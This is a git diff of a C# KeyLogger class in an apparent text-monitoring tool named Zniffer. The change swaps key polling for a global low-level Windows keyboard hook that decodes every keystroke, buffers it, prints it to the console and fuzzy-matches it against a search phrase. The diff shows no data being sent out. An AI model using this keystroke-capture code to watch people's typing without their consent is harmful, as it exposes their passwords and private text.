@@ -6,18 +6,31 @@ using System.Globalization;
 using System.Threading;
 using CustomExtensions;
 using Zniffer.Levenshtein;
+using System.Diagnostics;
+using System.Collections.Generic;
 
 namespace Zniffer.FilesAndText {
     class KeyLogger {
+        #region DllImports
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
-        //event raised when key is pressed
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+
+        IntPtr wParam, IntPtr lParam);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        #endregion
+
         public delegate void keyCaptured(string s);
 
         public static System.Timers.Timer timerResetString = new System.Timers.Timer(5000);//5sec reset time
-
-        private System.Timers.Timer timerKeyMine;
-        private string handleCurrentWindow;
-        private string handlePrevWindow;
 
         #region modifiers
         static bool shift = false;
@@ -30,392 +43,275 @@ namespace Zniffer.FilesAndText {
         public static long cursorPosition = 0;
         #endregion
 
-        string decimalSeparator = new CultureInfo(Thread.CurrentThread.CurrentCulture.Name, false).NumberFormat.NumberDecimalSeparator;
+        static string decimalSeparator = new CultureInfo(Thread.CurrentThread.CurrentCulture.Name, false).NumberFormat.NumberDecimalSeparator;
+
+        private static MainWindow window;
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule) {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(
+            int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr HookCallback(
+            int nCode, IntPtr wParam, IntPtr lParam) {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+                int vkCode = Marshal.ReadInt32(lParam);
+                
+                if(Keys.Control == Control.ModifierKeys) {
+                    control = true;
+                }
+                if(Keys.Shift == Control.ModifierKeys) {
+                    shift = true;
+                }
+                if(Keys.RMenu == Control.ModifierKeys) {
+                    alt = true;
+                }
+
+                if (Enum.GetName(typeof(Keys), vkCode) == "Back")
+                    KeyCapturedHandle("<Backspace>");
+                else if (Enum.GetName(typeof(Keys), vkCode) == "Space")
+                    KeyCapturedHandle(" ");
+                else if (Enum.GetName(typeof(Keys), vkCode) == "Return")
+                    KeyCapturedHandle("\n");
+                else if (Enum.GetName(typeof(Keys), vkCode) == "Delete")
+                    KeyCapturedHandle("<Del>");
+                else if (Enum.GetName(typeof(Keys), vkCode) == "Home")
+                    KeyCapturedHandle("<Home>");
+                else if (Enum.GetName(typeof(Keys), vkCode) == "End")
+                    KeyCapturedHandle("<End>");
+                else if (Enum.GetName(typeof(Keys), vkCode) == "Tab")
+                    KeyCapturedHandle("<Tab>");
+                else if (Enum.GetName(typeof(Keys), vkCode) == "Left")
+                    KeyCapturedHandle("<Left>");
+                else if (Enum.GetName(typeof(Keys), vkCode) == "Right")
+                    KeyCapturedHandle("<Right>");
+                else {
+                    KeysConverter kc = new KeysConverter();
+                    string keyChar = kc.ConvertToString(vkCode);
+
+                    if (string.Equals(keyChar, "decimal", StringComparison.OrdinalIgnoreCase))
+                        keyChar = ",";
+
+                    if (!shift) {
+                        keyChar = keyChar.ToLower();
+
+
+                        if (string.Equals(keyChar, "oemminus", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "-";
+                        else if (string.Equals(keyChar, "oemplus", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "=";
+                        else if (string.Equals(keyChar, "oemtilde", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "`";
+                        else if (string.Equals(keyChar, "oemopenbrackets", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "[";
+                        else if (string.Equals(keyChar, "oem6", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "]";
+                        else if (string.Equals(keyChar, "oem5", StringComparison.OrdinalIgnoreCase))
+                            keyChar = @"\";
+                        else if (string.Equals(keyChar, "oem7", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "'";
+                        else if (string.Equals(keyChar, "oem1", StringComparison.OrdinalIgnoreCase))
+                            keyChar = ";";
+                        else if (string.Equals(keyChar, "oemquestion", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "/";
+                        else if (string.Equals(keyChar, "oemperiod", StringComparison.OrdinalIgnoreCase))
+                            keyChar = ".";
+                        else if (string.Equals(keyChar, "oemcomma", StringComparison.OrdinalIgnoreCase))
+                            keyChar = ",";
+                        else if (string.Equals(keyChar, "decimal", StringComparison.OrdinalIgnoreCase))
+                            keyChar = decimalSeparator;
+
+                        else if (string.Equals(keyChar, "numpad1", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "1";
+                        else if (string.Equals(keyChar, "numpad2", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "2";
+                        else if (string.Equals(keyChar, "numpad3", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "3";
+                        else if (string.Equals(keyChar, "numpad4", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "4";
+                        else if (string.Equals(keyChar, "numpad5", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "5";
+                        else if (string.Equals(keyChar, "numpad6", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "6";
+                        else if (string.Equals(keyChar, "numpad7", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "7";
+                        else if (string.Equals(keyChar, "numpad8", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "8";
+                        else if (string.Equals(keyChar, "numpad9", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "9";
+                        else if (string.Equals(keyChar, "numpad0", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "0";
 
 
 
-        private MainWindow window;
+                    }
+                    else {
+                        keyChar = keyChar.ToUpper();
+
+                        if (string.Equals(keyChar, "oemminus", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "_";
+                        else if (string.Equals(keyChar, "oemplus", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "=";
+                        else if (string.Equals(keyChar, "oemtilde", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "~";
+                        else if (string.Equals(keyChar, "oemopenbrackets", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "{";
+                        else if (string.Equals(keyChar, "oem6", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "}";
+                        else if (string.Equals(keyChar, "oem5", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "|";
+                        else if (string.Equals(keyChar, "oem7", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "\"";
+                        else if (string.Equals(keyChar, "oem1", StringComparison.OrdinalIgnoreCase))
+                            keyChar = ":";
+                        else if (string.Equals(keyChar, "oemquestion", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "?";
+                        else if (string.Equals(keyChar, "oemperiod", StringComparison.OrdinalIgnoreCase))
+                            keyChar = ">";
+                        else if (string.Equals(keyChar, "oemcomma", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "<";
+                        else if (string.Equals(keyChar, "decimal", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "<Del>";
+                        else if (string.Equals(keyChar, "1", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "!";
+                        else if (string.Equals(keyChar, "2", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "@";
+                        else if (string.Equals(keyChar, "3", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "#";
+                        else if (string.Equals(keyChar, "4", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "$";
+                        else if (string.Equals(keyChar, "5", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "%";
+                        else if (string.Equals(keyChar, "6", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "^";
+                        else if (string.Equals(keyChar, "7", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "&";
+                        else if (string.Equals(keyChar, "8", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "*";
+                        else if (string.Equals(keyChar, "9", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "(";
+                        else if (string.Equals(keyChar, "0", StringComparison.OrdinalIgnoreCase))
+                            keyChar = ")";
+
+                    }
+
+                    if (string.Equals(keyChar, "divide", StringComparison.OrdinalIgnoreCase))
+                        keyChar = "/";
+                    else if (string.Equals(keyChar, "multiply", StringComparison.OrdinalIgnoreCase))
+                        keyChar = "*";
+                    else if (string.Equals(keyChar, "subtract", StringComparison.OrdinalIgnoreCase))
+                        keyChar = "-";
+                    else if (string.Equals(keyChar, "add", StringComparison.OrdinalIgnoreCase))
+                        keyChar = "+";
+                    else if (string.Equals(keyChar, "enter", StringComparison.OrdinalIgnoreCase))
+                        keyChar = "\n";
+
+                    if (alt) {
+                        if (string.Equals(keyChar, "a", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "ą";
+                        else if (string.Equals(keyChar, "z", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "ż";
+                        else if (string.Equals(keyChar, "x", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "ź";
+                        else if (string.Equals(keyChar, "c", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "ć";
+                        else if (string.Equals(keyChar, "e", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "ę";
+                        else if (string.Equals(keyChar, "s", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "ś";
+                        else if (string.Equals(keyChar, "n", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "ń";
+                        else if (string.Equals(keyChar, "o", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "ó";
+                        else if (string.Equals(keyChar, "l", StringComparison.OrdinalIgnoreCase))
+                            keyChar = "ł";
+
+                    }
+
+                    KeyCapturedHandle(keyChar);
+                }
+                control = shift = alt = false;
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+
 
         public KeyLogger(MainWindow window) {
-            this.window = window;
+            KeyLogger.window = window;
 
-            timerKeyMine = new System.Timers.Timer();
-            timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(getPressedKeys);
-            timerKeyMine.Interval = 10;
-            timerKeyMine.Enabled = true;
-
-            timerResetString.Elapsed += new System.Timers.ElapsedEventHandler(OnResetTimerEvent);
+            _hookID = SetHook(_proc);
+        }
+        ~KeyLogger() {
+            UnhookWindowsHookEx(_hookID);
         }
 
         public void OnResetTimerEvent(object source, System.Timers.ElapsedEventArgs e) {
             cursorPosition = 0;
             keyBuffer = "";
-
         }
 
-        private void KeyCapturedHandle(string s) {
+        private static void KeyCapturedHandle(string s) {
             if (s.Substring(0, 1).Equals("[") && s.Substring(s.Length - 1, 1).Equals("]")) {
 
-            }else {
+            }
+            else {
 
                 if (s.Substring(0, 1).Equals("<") && s.Substring(s.Length - 1, 1).Equals(">")) {//special characters
-                s = s.Substring(1, s.Length - 2);
-                if (s.Equals("Backspace")) {
-                    timerResetString.Stop();
-                    if (keyBuffer.Length > 0) {
-                        keyBuffer = keyBuffer.Remove(keyBuffer.Length - 1);
-                        cursorPosition--;
-                    }
-                }
-                else if (s.Equals("Left")) {
-                    timerResetString.Stop();
-
-                    if (cursorPosition > 0)
-                        cursorPosition--;
-                }
-                else if (s.Equals("Right")) {
-                    timerResetString.Stop();
-
-                    if (cursorPosition < keyBuffer.Length)
-                        cursorPosition++;
-                }
-            }
-            else {//normal characters
-                timerResetString.Stop();
-
-                keyBuffer += s;
-                cursorPosition++;
-
-                if (s.Equals("\n")) {//user returned(ended) string
-                    cursorPosition = 0;
-                    keyBuffer = "";
-                }
-            }
-
-            if (keyBuffer.Length > 50)
-                keyBuffer = keyBuffer.Remove(0, 1);
-            Console.Out.WriteLine(keyBuffer);
-            string phrase = MainWindow.SearchPhrase;
-            LevenshteinMatches result = keyBuffer.Levenshtein(phrase, mode: MainWindow.SearchMode);
-
-            if (result !=null && result.hasMatches) {
-                window.AddTextToClipBoardBox(result);
-            }
-
-            timerResetString.Start();
-            }
-        }
-
-
-        public static string GetForegroundApplication() {
-            IntPtr handle = GetForegroundWindow();
-            StringBuilder title = new StringBuilder(1024);
-            int len = GetWindowText(handle, title, title.Capacity);
-            if ((len <= 0) || (len > title.Length))
-                return "unknown";
-            return title.ToString();
-        }
-
-        public void getPressedKeys(object sender, System.Timers.ElapsedEventArgs easd) {
-            handleCurrentWindow = GetForegroundApplication();
-
-            if (handleCurrentWindow != handlePrevWindow) {//focuse changed
-                KeyCapturedHandle("[" + handleCurrentWindow + "]");
-                handlePrevWindow = handleCurrentWindow;
-            }
-
-            foreach (int i in Enum.GetValues(typeof(Keys))) {
-                if (GetAsyncKeyState(i) == -32767) {
-
-                    bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
-                    bool NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
-
-                    if (ControlKeyActive) {
-                        control = true;
-                    }
-                    if (AltKeyActive) {
-                        alt = true;
-                    }
-
-                    if ((CapsLock || ShiftKeyActive) && !(CapsLock && ShiftKeyActive))
-                        shift = true;
-
-
-                    if (Enum.GetName(typeof(Keys), i) == "LButton")
-                        KeyCapturedHandle("<LMouse>");
-                    else if (Enum.GetName(typeof(Keys), i) == "RButton")
-                        KeyCapturedHandle("<RMouse>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Back")
-                        KeyCapturedHandle("<Backspace>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Space")
-                        KeyCapturedHandle(" ");
-                    else if (Enum.GetName(typeof(Keys), i) == "Return")
-                        KeyCapturedHandle("\n");
-                    else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
-                        continue;
-                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
-                        continue;
-                    else if (Enum.GetName(typeof(Keys), i) == "RControlKey")
-                        continue;
-                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
-                        continue;
-                    else if (Enum.GetName(typeof(Keys), i) == "ShiftKey")
-                        continue;
-                    else if (Enum.GetName(typeof(Keys), i) == "LShiftKey")
-                        continue;
-                    else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
-                        continue;
-                    else if (Enum.GetName(typeof(Keys), i) == "Delete")
-                        KeyCapturedHandle("<Del>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Insert")
-                        KeyCapturedHandle("<Ins>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Home")
-                        KeyCapturedHandle("<Home>");
-                    else if (Enum.GetName(typeof(Keys), i) == "End")
-                        KeyCapturedHandle("<End>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Tab")
-                        KeyCapturedHandle("<Tab>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Prior")
-                        KeyCapturedHandle("<Page Up>");
-                    else if (Enum.GetName(typeof(Keys), i) == "PageDown")
-                        KeyCapturedHandle("<Page Down>");
-                    else if (Enum.GetName(typeof(Keys), i) == "LWin")
-                        KeyCapturedHandle("<LWin>");
-                    else if (Enum.GetName(typeof(Keys), i) == "RWin")
-                        KeyCapturedHandle("<RWin>");
-                    else if (Enum.GetName(typeof(Keys), i) == "CapsLock")
-                        KeyCapturedHandle("<CapsLock>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Apps")
-                        KeyCapturedHandle("<Apps>");
-                    else if (Enum.GetName(typeof(Keys), i) == "PrintScreen")
-                        KeyCapturedHandle("<PrintScreen>");
-                    else if (Enum.GetName(typeof(Keys), i) == "NumLock")
-                        KeyCapturedHandle("<NumLock>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Scroll")
-                        KeyCapturedHandle("<Scroll>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Escape")
-                        KeyCapturedHandle("<Escape>");
-                    else if (Enum.GetName(typeof(Keys), i) == "LMenu")
-                        KeyCapturedHandle("<LeftAlt>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Menu")
-                        KeyCapturedHandle("<Alt>");
-                    else if (Enum.GetName(typeof(Keys), i) == "RMenu")
-                        KeyCapturedHandle("<RightAlt>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Pause")
-                        KeyCapturedHandle("<Pause>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Clear")
-                        KeyCapturedHandle("<Clear>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Up")
-                        KeyCapturedHandle("<Up>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Down")
-                        KeyCapturedHandle("<Down>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Left")
-                        KeyCapturedHandle("<Left>");
-                    else if (Enum.GetName(typeof(Keys), i) == "Right")
-                        KeyCapturedHandle("<Right>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F12")
-                        KeyCapturedHandle("<F12>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F11")
-                        KeyCapturedHandle("<F11>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F10")
-                        KeyCapturedHandle("<F10>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F9")
-                        KeyCapturedHandle("<F9>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F8")
-                        KeyCapturedHandle("<F8>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F7")
-                        KeyCapturedHandle("<F7>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F6")
-                        KeyCapturedHandle("<F6>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F5")
-                        KeyCapturedHandle("<F5>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F4")
-                        KeyCapturedHandle("<F4>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F3")
-                        KeyCapturedHandle("<F3>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F2")
-                        KeyCapturedHandle("<F2>");
-                    else if (Enum.GetName(typeof(Keys), i) == "F1")
-                        KeyCapturedHandle("<F1>");
-                    else {
-                        KeysConverter kc = new KeysConverter();
-                        string keyChar = kc.ConvertToString(i);
-
-                        if (string.Equals(keyChar, "decimal", StringComparison.OrdinalIgnoreCase))
-                            keyChar = ",";
-
-                        if (!shift) {
-                            keyChar = keyChar.ToLower();
-
-
-                            if (string.Equals(keyChar, "oemminus", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "-";
-                            else if (string.Equals(keyChar, "oemplus", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "=";
-                            else if (string.Equals(keyChar, "oemtilde", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "`";
-                            else if (string.Equals(keyChar, "oemopenbrackets", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "[";
-                            else if (string.Equals(keyChar, "oem6", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "]";
-                            else if (string.Equals(keyChar, "oem5", StringComparison.OrdinalIgnoreCase))
-                                keyChar = @"\";
-                            else if (string.Equals(keyChar, "oem7", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "'";
-                            else if (string.Equals(keyChar, "oem1", StringComparison.OrdinalIgnoreCase))
-                                keyChar = ";";
-                            else if (string.Equals(keyChar, "oemquestion", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "/";
-                            else if (string.Equals(keyChar, "oemperiod", StringComparison.OrdinalIgnoreCase))
-                                keyChar = ".";
-                            else if (string.Equals(keyChar, "oemcomma", StringComparison.OrdinalIgnoreCase))
-                                keyChar = ",";
-                            else if (string.Equals(keyChar, "decimal", StringComparison.OrdinalIgnoreCase))
-                                keyChar = decimalSeparator;
-
-                            else if (string.Equals(keyChar, "numpad1", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "1";
-                            else if (string.Equals(keyChar, "numpad2", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "2";
-                            else if (string.Equals(keyChar, "numpad3", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "3";
-                            else if (string.Equals(keyChar, "numpad4", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "4";
-                            else if (string.Equals(keyChar, "numpad5", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "5";
-                            else if (string.Equals(keyChar, "numpad6", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "6";
-                            else if (string.Equals(keyChar, "numpad7", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "7";
-                            else if (string.Equals(keyChar, "numpad8", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "8";
-                            else if (string.Equals(keyChar, "numpad9", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "9";
-                            else if (string.Equals(keyChar, "numpad0", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "0";
-
-
-
-                        } else {
-                            keyChar = keyChar.ToUpper();
-
-                            if (string.Equals(keyChar, "oemminus", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "_";
-                            else if (string.Equals(keyChar, "oemplus", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "=";
-                            else if (string.Equals(keyChar, "oemtilde", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "~";
-                            else if (string.Equals(keyChar, "oemopenbrackets", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "{";
-                            else if (string.Equals(keyChar, "oem6", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "}";
-                            else if (string.Equals(keyChar, "oem5", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "|";
-                            else if (string.Equals(keyChar, "oem7", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "\"";
-                            else if (string.Equals(keyChar, "oem1", StringComparison.OrdinalIgnoreCase))
-                                keyChar = ":";
-                            else if (string.Equals(keyChar, "oemquestion", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "?";
-                            else if (string.Equals(keyChar, "oemperiod", StringComparison.OrdinalIgnoreCase))
-                                keyChar = ">";
-                            else if (string.Equals(keyChar, "oemcomma", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "<";
-                            else if (string.Equals(keyChar, "decimal", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "<Del>";
-                            else if (string.Equals(keyChar, "1", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "!";
-                            else if (string.Equals(keyChar, "2", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "@";
-                            else if (string.Equals(keyChar, "3", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "#";
-                            else if (string.Equals(keyChar, "4", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "$";
-                            else if (string.Equals(keyChar, "5", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "%";
-                            else if (string.Equals(keyChar, "6", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "^";
-                            else if (string.Equals(keyChar, "7", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "&";
-                            else if (string.Equals(keyChar, "8", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "*";
-                            else if (string.Equals(keyChar, "9", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "(";
-                            else if (string.Equals(keyChar, "0", StringComparison.OrdinalIgnoreCase))
-                                keyChar = ")";
-
+                    s = s.Substring(1, s.Length - 2);
+                    if (s.Equals("Backspace")) {
+                        timerResetString.Stop();
+                        if (keyBuffer.Length > 0) {
+                            keyBuffer = keyBuffer.Remove(keyBuffer.Length - 1);
+                            cursorPosition--;
                         }
-
-                        if (string.Equals(keyChar, "divide", StringComparison.OrdinalIgnoreCase))
-                            keyChar = "/";
-                        else if (string.Equals(keyChar, "multiply", StringComparison.OrdinalIgnoreCase))
-                            keyChar = "*";
-                        else if (string.Equals(keyChar, "subtract", StringComparison.OrdinalIgnoreCase))
-                            keyChar = "-";
-                        else if (string.Equals(keyChar, "add", StringComparison.OrdinalIgnoreCase))
-                            keyChar = "+";
-                        else if (string.Equals(keyChar, "enter", StringComparison.OrdinalIgnoreCase))
-                            keyChar = "\n";
-
-                        if (alt) {
-                            if (string.Equals(keyChar, "a", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "ą";
-                            else if (string.Equals(keyChar, "z", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "ż";
-                            else if (string.Equals(keyChar, "x", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "ź";
-                            else if (string.Equals(keyChar, "c", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "ć";
-                            else if (string.Equals(keyChar, "e", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "ę";
-                            else if (string.Equals(keyChar, "s", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "ś";
-                            else if (string.Equals(keyChar, "n", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "ń";
-                            else if (string.Equals(keyChar, "o", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "ó";
-                            else if (string.Equals(keyChar, "l", StringComparison.OrdinalIgnoreCase))
-                                keyChar = "ł";
-
-                        }
-
-
-                        //"{" + Convert.ToInt32(control) + Convert.ToInt32(alt) + "}" + 0 false 1 true
-
-                        KeyCapturedHandle(keyChar);
                     }
+                    else if (s.Equals("Left")) {
+                        timerResetString.Stop();
 
-                    control = shift = alt = false;
+                        if (cursorPosition > 0)
+                            cursorPosition--;
+                    }
+                    else if (s.Equals("Right")) {
+                        timerResetString.Stop();
+
+                        if (cursorPosition < keyBuffer.Length)
+                            cursorPosition++;
+                    }
+                }
+                else {//normal characters
+                    timerResetString.Stop();
+
+                    keyBuffer += s;
+                    cursorPosition++;
+
+                    if (s.Equals("\n")) {//user returned(ended) string
+                        cursorPosition = 0;
+                        keyBuffer = "";
+                    }
                 }
 
+                if (keyBuffer.Length > 50)
+                    keyBuffer = keyBuffer.Remove(0, 1);
+                Console.Out.WriteLine(keyBuffer);
+                string phrase = MainWindow.SearchPhrase;
+                LevenshteinMatches result = keyBuffer.Levenshtein(phrase, mode: MainWindow.SearchMode);
+
+                if (result != null && result.hasMatches) {
+                    window.AddTextToClipBoardBox(result);
+                }
+
+                timerResetString.Start();
             }
         }
-
-        #region ToggleKeys
-        public static bool ControlKeyActive {// ControlKey
-            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.ControlKey) & 0x8000); }
-        }
-        public static bool ShiftKeyActive {// ShiftKey
-            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000); }
-        }
-        public static bool AltKeyActive {// AltKey
-            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.Menu) & 0x8000); }
-        }
-        #endregion
-
-        #region DllImports
-        [DllImport("User32.dll")]
-        public static extern int GetAsyncKeyState(int i);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
-        public static extern short GetKeyState(int keyCode);
-
-        [DllImport("user32.dll")]
-        static extern IntPtr GetForegroundWindow();
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
-
-        #endregion
     }
 }
